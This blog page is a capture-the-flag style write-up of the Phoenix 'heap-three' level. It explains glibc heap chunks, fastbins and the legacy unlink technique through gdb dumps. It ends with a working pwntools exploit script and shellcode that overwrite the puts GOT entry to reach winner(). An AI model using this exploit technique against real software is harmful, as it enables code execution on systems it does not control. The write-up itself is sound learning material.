<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Phoenix - Heap Three - Zakariae el bouzarazi</title>
<meta name="description" content="This level is by far the hardest one and I learned a lot from it, I really encourage you to read through the references before reading the writeup if you don’t know how the heap works. The code first allocates 3 memory chunks, copies arguments to them then free the allocated memory… ">


  <meta name="author" content="Zakariae El bouzarazi">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zakariae el bouzarazi">
<meta property="og:title" content="Phoenix - Heap Three">
<meta property="og:url" content="https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/heap-three/">


  <meta property="og:description" content="This level is by far the hardest one and I learned a lot from it, I really encourage you to read through the references before reading the writeup if you don’t know how the heap works. The code first allocates 3 memory chunks, copies arguments to them then free the allocated memory… ">



  <meta property="og:image" content="https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png">





  <meta property="article:published_time" content="2020-02-13T00:00:00+01:00">





  

  


<link rel="canonical" href="https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/heap-three/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "zakariae Elbouzarazi",
      "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/"
    
  }
</script>


  <meta name="google-site-verification" content="J3MnMF94zaZhTUoNtUiRt9cKsr7hiMyTxEdAvQ3GfmY" />





<!-- end _includes/seo.html -->


<link href="/pages/elbouzarazi/feed.xml" type="application/atom+xml" rel="alternate" title="Zakariae el bouzarazi Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/pages/elbouzarazi/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/pages/elbouzarazi/"><img src="/pages/elbouzarazi/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/pages/elbouzarazi/">
          Zakariae el bouzarazi
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories/#malware-analysis">Malware Analysis</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories/#binary-exploitation">Binary Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories/#ctf-writeups">CTF Writeups</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories/#tutorials">Tutorials</a>
            </li><li class="masthead__menu-item">
              <a href="/pages/elbouzarazi/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/pages/elbouzarazi/assets/images/site_data/avatar.jpg" alt="Zakariae El bouzarazi" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zakariae El bouzarazi</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Malware Analysis &amp; Reverse Engineering Adventures.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="zekuelbouzrazi@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/_n1ghtw0lf" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zakariae-elbouzarazi-34126b293/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/elbouzarazi" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Phoenix - Heap Three">
    <meta itemprop="description" content="```c#include #include #include #include &lt;sys/types.h&gt;#include #include ">
    <meta itemprop="datePublished" content="2020-02-13T00:00:00+01:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Phoenix - Heap Three
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  9 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Level was successfully completed at @ %ld seconds past the Epoch</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
      <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>

  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>

  <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>

  <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"dynamite failed?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This level is by far the hardest one and I learned a lot from it, I really encourage you to read through the references before reading the writeup if you don’t know how the heap works.</p>

<p>The code first allocates 3 memory chunks, copies arguments to them then free the allocated memory. The bug here is the use of <strong>strcpy</strong> without size checking so we can overflow the heap.</p>

<p>Every heap chunk will look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start
 |     PREV_SIZE (if P = 0)  |
 +-----------------+-+-+-+-+-+
 |     CHUNK SIZE      |A|M|P|
 +-----------------+-+-+-+-+-+ &lt;-- Pointer returned by malloc
 |     USER DATA             |
 +---------------------------+ &lt;-- Chunk end
</code></pre></div></div>

<p>An allocated chunk consists of 3 parts. Two of them being 8 byte or 4 byte headers on 64bit/32bit systems respectively. The third chunk is the user data.</p>

<p>The first byte is the size of the previous chunk and it’s only set if the previous chunk if free.</p>

<p>The second part <strong>chunk size</strong> is 16 bytes padded, so the last 3 bits are used as flags or properties (<strong>A</strong>rena bit │  <strong>M</strong>MAPed bit │ <strong>P</strong>revious in-use bit), I won’t go into details here.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb -q /opt/phoenix/i486/heap-three 
Reading symbols from /opt/phoenix/i486/heap-three...(no debugging symbols found)...done.

gef➤  disassemble main 
Dump of assembler code for function main:
.....
   0x0804887d &lt;+129&gt;:	call   0x8048560 &lt;strcpy@plt&gt;
   0x08048882 &lt;+134&gt;:	add    esp,0x10
   0x08048885 &lt;+137&gt;:	sub    esp,0xc
   0x08048888 &lt;+140&gt;:	push   DWORD PTR [ebp-0x14]
   0x0804888b &lt;+143&gt;:	call   0x8049857 &lt;free&gt;
.....

gef➤  b *0x08048882
Breakpoint 1 at 0x8048882

gef➤  r AAAAAAAAAA BBBBBBBBBBB CCCCCCCCCCC
Starting program: /opt/phoenix/i486/heap-three AAAAAAAAAA BBBBBBBBBBB CCCCCCCCCCC
Breakpoint 1, 0x08048882 in main ()

gef➤  info proc mappings
process 324
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x804c000     0x4000        0x0 /opt/phoenix/i486/heap-three
	 0x804c000  0x804d000     0x1000     0x3000 /opt/phoenix/i486/heap-three
	0xf7e69000 0xf7f69000   0x100000        0x0		======&gt; This is the heap
.....

gef➤  x/28xw 0xf7e69000
0xf7e69000:	0x00000000	0x00000029	0x41414141	0x41414141
0xf7e69010:	0x00004141	0x00000000	0x00000000	0x00000000
0xf7e69020:	0x00000000	0x00000000	0x00000000	0x00000029
0xf7e69030:	0x42424242	0x42424242	0x00424242	0x00000000
0xf7e69040:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69050:	0x00000000	0x00000029	0x43434343	0x43434343
0xf7e69060:	0x00434343	0x00000000	0x00000000	0x00000000
</code></pre></div></div>

<p>As you can see each chunk has two words before it’s content (prev_size and chunk_size), 0x29 = 101001 and we said the last 3 bits are flags so the real size is 0x28 and the last bit is set indicating the the previous chunk is in use.</p>

<p>When we free these chunks they go to something called <strong>bins</strong> to be reused later by <strong>malloc</strong> if we need to allocate new memory. The heap manager first checks the size of the chunk and if its size is &lt;= <strong>(80 * SIZE_SZ / 4)</strong> which is 80 on 32-bit machine, 160 on 64-bit machine, The chunk will will be will be treated as <strong>fastbin</strong>.</p>

<p>Fast bins are singly linked list of free memory chunks, every chunk points to the next fast bin using the FD (forward pointer) which is written at the first word of the chunk.</p>

<p>Fast bins:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start
 |     PREV_SIZE (if P = 0)  |
 +-----------------+-+-+-+-+-+
 |     CHUNK SIZE      |A|M|P|
 +-----------------+-+-+-+-+-+ &lt;-- Pointer returned by malloc
 |     FD pointer            |
 +-----------------+-+-+-+-+-+
 |     Unused Space          |
 +---------------------------+ &lt;-- Chunk end
</code></pre></div></div>

<p>Let’s check our chunks after they got freed:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  b *0x080488b2
Breakpoint 2 at 0x80488b2

gef➤  c
Continuing.

gef➤  x/28xw 0xf7e69000
0xf7e69000:	0x00000000	0x00000029	0xf7e69028	0x41414141
0xf7e69010:	0x00004141	0x00000000	0x00000000	0x00000000
0xf7e69020:	0x00000000	0x00000000	0x00000000	0x00000029
0xf7e69030:	0xf7e69050	0x42424242	0x00424242	0x00000000
0xf7e69040:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69050:	0x00000000	0x00000029	0x00000000	0x43434343
0xf7e69060:	0x00434343	0x00000000	0x00000000	0x00000000
</code></pre></div></div>

<p>As you can see, The first word of chunk <strong>b</strong> points to chunk <strong>c</strong> and first word of chunk <strong>a</strong> points to <strong>b</strong>. we can see that in the code from <strong>malloc-2.7.2.c</strong> implementation (<strong>free</strong> function):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">((</span><span class="n">CHUNK_SIZE_T</span><span class="p">)(</span><span class="n">size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">CHUNK_SIZE_T</span><span class="p">)(</span><span class="n">av</span><span class="o">-&gt;</span><span class="n">max_fast</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">!=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">set_fastchunks</span><span class="p">(</span><span class="n">av</span><span class="p">);</span>
    <span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">av</span><span class="o">-&gt;</span><span class="n">fastbins</span><span class="p">[</span><span class="n">fastbin_index</span><span class="p">(</span><span class="n">size</span><span class="p">)]);</span>		<span class="c1">// get forward bin</span>
    <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>					<span class="c1">// FD of current bin = fb</span>
    <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>						<span class="c1">// fb = current bin</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The exploit here is in this version of malloc is in the <strong>unlink</strong> macro which is used to consolidate continuous free memory chunks together in one big chunk.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-------+       +-------+     +-------+
|CHUNK 1|       |CHUNK P|     |CHUNK 3|
+-------+       +-------+     +-------+   
|  FD   |------&gt;|  FD   |----&gt;|  FD   |
+-------+       +-------+     +-------+   
|  BK   |&lt;------|  BK   |&lt;----|  BK   |
+-------+       +-------+     +-------+

              ,-\-------/.
,-&gt;+-------+  | +\-----/+ `--&gt;+-------+
|  |CHUNK 1|  | |C\UNK/P|     |CHUNK 3|
|  +-------+  | +--\-/--+     +-------+   
|  |  FD   |--´ |  FX   |     |  FD   |
|  +-------+    +--/-\--+     +-------+   
|  |  BK   |    | /BK \ |  ,--|  BK   |
|  +-------+    +/-----\+  |  +-------+
 `--------------/-------\--+
</code></pre></div></div>

<p>The problem here is that <strong>unlink</strong> is not used with fastbins so we need to overwrite the size of a chunk to fool the heap manager into thinking that it’s not a fastbin (unsorted bin in this case).</p>

<p>Let’s see first how unlock works:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define 
</span><span class="n">unlink</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">BK</span><span class="p">,</span> <span class="n">FD</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>                                                          
  <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>                                                          
  <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>                                                         
  <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                                                         
<span class="p">}</span>
</code></pre></div></div>

<p>Forward Pointer <strong>FD</strong> is at offset 8 of a free chunk (after the prev_size and chunk_size), and Backward Pointer <strong>BK</strong> is at offset 12 (after FD pointer).</p>

<p>so the last two lines can be translated as:</p>

<p>[FD + 12] = BK
[BK + 8] = FD</p>

<p>Great, Now we can write to arbitrary memory but where to write ?? we must choose two addresses as FD and BK and the two of them must be in writable memory regions.</p>

<p>FD can be the <strong>GOT</strong> entry of <strong>puts</strong> function which is called at the end of the code, GOT is writable so no problems here.</p>

<p>Remember the goal of this level is to call <strong>winner</strong> function so we can choose BK as the address of <strong>winner</strong>, the problem is that it’s address is at the <strong>.text</strong> section which isn’t writable :(</p>

<p>A workaround here is to write a shellcode to a writable memory region and that shellcode will jump to <strong>winner</strong> function, and the best place to write our shellcode is the heap itself (at any of the 3 chunks).</p>

<p>The last bit of the puzzle is to choose the chunk to overwrite it’s size to be <strong>unsorted bin</strong> instead of <strong>fast bin</strong>, we will choose chunk <strong>c</strong>.</p>

<p>This is the code that will be executed if not a fastbin:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nextchunk</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
<span class="n">nextsize</span> <span class="o">=</span> <span class="n">chunksize</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">);</span>

<span class="cm">/* consolidate backward */</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>					<span class="c1">// if the previous chunk is not in use (free)</span>
    <span class="n">prevsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prev_size</span><span class="p">;</span>				<span class="c1">// get previous size of current chunk</span>
    <span class="n">size</span> <span class="o">+=</span> <span class="n">prevsize</span><span class="p">;</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span> <span class="n">prevsize</span><span class="p">));</span>		<span class="c1">// add the prevsize to current position to get to the previous chunk</span>
    <span class="n">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>				<span class="c1">// unlink the previous chunk (throw it away)</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">nextchunk</span> <span class="o">!=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">)</span> <span class="p">{</span>					<span class="c1">// if the current chunk is not the top of the heap</span>
    <span class="cm">/* get and clear inuse bit */</span>
    <span class="n">nextinuse</span> <span class="o">=</span> <span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span> <span class="n">nextsize</span><span class="p">);</span>	<span class="c1">// check if next chunk is in use (not free)</span>
    <span class="n">set_head</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span> <span class="n">nextsize</span><span class="p">);</span>

    <span class="cm">/* consolidate forward */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">nextinuse</span><span class="p">)</span> <span class="p">{</span>						<span class="c1">// if next chunk is not in use (free)</span>
        <span class="n">unlink</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>				<span class="c1">// unlink the next chunk (throw it away)</span>
        <span class="n">size</span> <span class="o">+=</span> <span class="n">nextsize</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">.....</span>
<span class="p">}</span>

</code></pre></div></div>

<p>We need just on consolidation (one unlink) to write to <strong>GOT</strong>, so we will adjust our exploit to use the backward consolidation.</p>

<p>Chunk <strong>c</strong>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xf7e69050:	0xfffffffc	0x00000029	0x00000000	0x43434343
0xf7e69060:	0x00434343	0x00000000	0x00000000	0x00000000
</code></pre></div></div>

<p>For <strong>prevsize</strong> we will write 0xfffffffc = -4 to jump to 0xf7e69050+4 = 0xf7e69054 which will be the start of previous chunk.</p>

<p>Now <strong>unlink</strong> will look for <strong>FD</strong>  at 0xf7e69054 + 8 = <strong>0xf7e6905c</strong> and <strong>BK</strong> 0xf7e69054 + 12 = <strong>0xf7e69060</strong>, so we will write those addresses there.</p>

<p><strong>FD</strong> will be puts_address-12 because at <strong>unlink</strong> [FD + 12] = BK.</p>

<p><strong>BK</strong> will be just shellcode_address ([BK + 8] will be overwritten but we don’t care as our shellcode will be just 6 bytes long).</p>

<p>With that we are done with backward consolidation, now we need to adjust the <strong>size</strong> value to jump to an address which is in use (not free) to avoid calling <strong>unlink</strong> again which might cause a segmentation fault.</p>

<p>Here we will adjust the size to jump to chunk <strong>a</strong>, before forward consolidation the code first checks  <strong>nextinuse</strong> which will check the <strong>prev in use</strong> flag of chunk <strong>b</strong> to check if chunk <strong>a</strong> if free or not, here it’s not so the code will just avoid the forward consolidation. the difference between chunk <strong>a</strong> and <strong>c</strong> is 0xf7e69050 - 0xf7e69000 = 80 so <strong>chunk_size</strong> of <strong>c</strong> will be <strong>0xffffffb0 = -80</strong>.</p>

<h1 id="solution">Solution:</h1>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># solve.py
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">puts_addr</span> <span class="o">=</span> <span class="mh">0x804c13c</span>
<span class="n">shellcode_addr</span> <span class="o">=</span> <span class="mh">0xf7e6900c</span>

<span class="s">'''
  push 0x80487d5      # winner_address
  ret
'''</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x68\xd5\x87\x04\x08\xc3</span><span class="s">'</span>


<span class="n">buff</span> <span class="o">=</span> <span class="s">""</span>

<span class="c1"># first chunk
</span><span class="n">buff</span> <span class="o">+=</span> <span class="s">'AAAA'</span>			<span class="c1"># This will be overwritten with FD when free(a)
</span><span class="n">buff</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">buff</span> <span class="o">+=</span> <span class="s">' '</span>

<span class="c1"># second chunk
</span><span class="n">buff</span> <span class="o">+=</span> <span class="s">'B'</span><span class="o">*</span><span class="mi">32</span>			<span class="c1"># Fill the second chunk
</span><span class="n">buff</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xfffffffc</span><span class="p">)</span>		<span class="c1"># prevsize of third chunk = -4 to jump inside itself when consolidating backward
</span><span class="n">buff</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffb0</span><span class="p">)</span>		<span class="c1"># size of third chunk = -80 to jump to first chunk when consolidating forward
</span><span class="n">buff</span> <span class="o">+=</span> <span class="s">' '</span>

<span class="c1"># third chunk
</span><span class="n">buff</span> <span class="o">+=</span> <span class="s">'AAAA'</span>			<span class="c1"># junk
</span><span class="n">buff</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_addr</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span>	<span class="c1"># will be p-&gt;fd
</span><span class="n">buff</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>	<span class="c1"># will be p-&gt;bk
</span>
<span class="k">print</span><span class="p">(</span><span class="n">buff</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ /opt/phoenix/i486/heap-three $(python solve.py)
Level was successfully completed at @ 1580754261 seconds past the Epoch
</code></pre></div></div>

<p>This might not be the best explanation but this level really required a lot of reading from different resources to grasp the concepts.</p>

<p>Note that this exploit is already patched in newer version of malloc.</p>

<h4 id="references">References:</h4>

<p><a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/</a></p>

<p><a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/</a></p>

<p><a href="https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/">https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/</a></p>

<p><a href="https://www.youtube.com/watch?v=gL45bjQvZSU">https://www.youtube.com/watch?v=gL45bjQvZSU</a></p>


        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/pages/elbouzarazi/categories/#binary-exploitation" class="page__taxonomy-item" rel="tag">Binary Exploitation</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-02-13T00:00:00+01:00">February 13, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/pages/elbouzarazi/binary%20exploitation/heap-two/" class="pagination--pager" title="Phoenix - Heap Two
">Previous</a>
    
    
      <a href="/pages/elbouzarazi/binary%20exploitation/net-zero/" class="pagination--pager" title="Phoenix - Net Zero
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/pages/elbouzarazi/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 zakariae Elbouzarazi. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/pages/elbouzarazi/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/pages/elbouzarazi/assets/js/lunr/lunr.min.js"></script>
<script src="/pages/elbouzarazi/assets/js/lunr/lunr-store.js"></script>
<script src="/pages/elbouzarazi/assets/js/lunr/lunr-en.js"></script>




  <script>
  window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
  ga('create','UA-165194559-1','auto');
  ga('set', 'anonymizeIp', false);
  ga('send','pageview')
</script>
<script src="https://www.google-analytics.com/analytics.js" async></script>









  </body>
</html>
